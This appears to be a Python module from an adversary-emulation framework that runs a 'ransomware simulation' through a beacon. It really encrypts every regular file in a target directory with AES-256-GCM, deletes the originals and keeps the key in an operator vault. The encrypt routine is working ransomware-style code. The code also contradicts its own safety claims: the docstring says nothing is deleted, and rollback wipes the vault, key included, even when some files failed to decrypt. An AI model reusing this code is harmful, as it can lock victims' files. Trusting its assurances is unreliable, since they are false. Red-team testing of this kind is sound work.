"""
ransom_sim.py — ransomware simulation with REAL reversible encryption.

A simulation that only moves files is not a ransomware simulation: the
demonstration value comes from the files being actually unusable. So this
module ENCRYPTS the target files (AES-256-GCM, per-file random nonce) —
but it is NOT destructive:

  * the per-run master key is stored in the manifest, which lives in the
    operator's vault (data/ransom_sim/), NEVER inside the attacked tree
  * rollback() decrypts every file back byte-identical (sha256-verified)
  * nothing is deleted, nothing is overwritten irreversibly

The beacon-facing surface mirrors the other post modules:
  * ransom_sim_command(dir)  -> the command line the beacon executes
  * ransom_sim_interpreter() -> parses the RANSOM_SIM: marker

The host-side RansomSimulator is used by tests, by preflight and by anyone
running the simulation locally against a replica.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import secrets
import time
from dataclasses import asdict, dataclass
from typing import Any, Dict, List

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from phantom.utils.paths import data_dir

MARKER = "RANSOM_SIM:"
ENC_SUFFIX = ".phnt"


def ransom_sim_command(dir_path: str = ".") -> str:
    """The command a beacon executes to run the simulation."""
    return f"ransom-sim {dir_path}"


@dataclass
class ManifestEntry:
    orig_rel: str          # path relative to the attacked directory
    orig_abspath: str      # absolute original location
    encrypted: str         # absolute path of the encrypted file
    nonce: str             # base64, 12 bytes AES-GCM nonce
    sha256: str            # of the ORIGINAL plaintext (verified on rollback)
    size: int


def _sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


class RansomSimulator:
    """Encrypts files in place (real, reversible) and restores them.

    Only regular files directly inside the attacked directory are touched;
    subdirectories and symlinks are left alone. The manifest (with the
    master key) is written to the operator vault so rollback is always
    possible — this is what keeps the simulation non-destructive.
    """

    def __init__(self, vault_dir: str = "") -> None:
        self.vault_dir = vault_dir or os.path.join(data_dir(), "ransom_sim")

    def encrypt(self, target_dir: str,
                run_id: str = "") -> Dict[str, Any]:
        """AES-256-GCM-encrypt every regular file of target_dir in place."""
        run_id = run_id or time.strftime("rs%Y%m%d%H%M%S")
        if not os.path.isdir(target_dir):
            raise NotADirectoryError(target_dir)

        master_key = secrets.token_bytes(32)
        aesgcm = AESGCM(master_key)
        entries: List[ManifestEntry] = []

        for name in sorted(os.listdir(target_dir)):
            src = os.path.join(target_dir, name)
            if not os.path.isfile(src) or os.path.islink(src):
                continue
            if name.endswith(ENC_SUFFIX):
                continue  # never double-encrypt an artifact
            with open(src, "rb") as f:
                plain = f.read()
            nonce = secrets.token_bytes(12)
            ct = aesgcm.encrypt(nonce, plain, None)  # ct = ciphertext + tag
            enc_path = src + ENC_SUFFIX
            with open(enc_path, "wb") as f:
                f.write(nonce + ct)
            os.remove(src)  # original content replaced by the ciphertext
            entries.append(ManifestEntry(
                orig_rel=name,
                orig_abspath=os.path.abspath(src),
                encrypted=enc_path,
                nonce=base64.b64encode(nonce).decode(),
                sha256=hashlib.sha256(plain).hexdigest(),
                size=len(plain)))

        manifest = {
            "run_id": run_id,
            "target_dir": os.path.abspath(target_dir),
            "vault_dir": os.path.abspath(self.vault_dir),
            "created": time.time(),
            "master_key": base64.b64encode(master_key).decode(),
            "cipher": "aes-256-gcm",
            "entries": [asdict(e) for e in entries],
        }
        run_dir = os.path.join(self.vault_dir, run_id)
        os.makedirs(run_dir, exist_ok=True)
        manifest_path = os.path.join(run_dir, "manifest.json")
        with open(manifest_path, "w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=2)
        return manifest

    def rollback(self, manifest_path: str) -> int:
        """Decrypt every encrypted file back byte-identical.

        Each plaintext is sha256-verified against the manifest before the
        ciphertext is removed; a mismatch aborts that entry (the original
        bytes stay recoverable in the vault file). Returns restored count.
        """
        with open(manifest_path, encoding="utf-8") as f:
            manifest = json.load(f)
        master_key = base64.b64decode(manifest["master_key"])
        aesgcm = AESGCM(master_key)
        restored = 0
        for e in manifest["entries"]:
            if not os.path.exists(e["encrypted"]):
                continue
            with open(e["encrypted"], "rb") as f:
                blob = f.read()
            nonce = base64.b64decode(e["nonce"])
            try:
                plain = aesgcm.decrypt(nonce, blob[len(nonce):], None)
            except Exception:
                continue  # tampered entry: keep ciphertext for recovery
            if hashlib.sha256(plain).hexdigest() != e["sha256"]:
                continue  # mismatch: do not touch anything
            with open(e["orig_abspath"], "wb") as f:
                f.write(plain)
            os.remove(e["encrypted"])
            restored += 1
        # remove the operator vault run dir (manifest + leftovers)
        import shutil
        shutil.rmtree(os.path.dirname(manifest_path), ignore_errors=True)
        return restored

    @staticmethod
    def marker_from_manifest(manifest: Dict[str, Any]) -> str:
        manifest_path = os.path.join(
            manifest["vault_dir"], manifest["run_id"], "manifest.json")
        return (f"{MARKER} encrypted={len(manifest['entries'])} "
                f"manifest={manifest_path} rollback_ready=true")


def ransom_sim_interpreter(output: str, wm, slots: Dict[str, Any]) -> List[Any]:
    """Parse RANSOM_SIM: markers into an impact finding."""
    from phantom.automation.belief import Finding

    findings = []
    for line in (output or "").splitlines():
        if not line.startswith(MARKER):
            continue
        kv: Dict[str, str] = {}
        for chunk in line[len(MARKER):].split():
            if "=" in chunk:
                k, v = chunk.split("=", 1)
                kv[k] = v
        findings.append(Finding(
            kind="ransom_sim", key=kv.get("manifest", "sim"),
            value={"dir": "", "encrypted": int(kv.get("encrypted", 0)),
                   "manifest": kv.get("manifest", ""),
                   "rollback_ready": kv.get("rollback_ready") == "true"},
            confidence=0.9, source="ransom_sim", target=wm.target))
    return findings
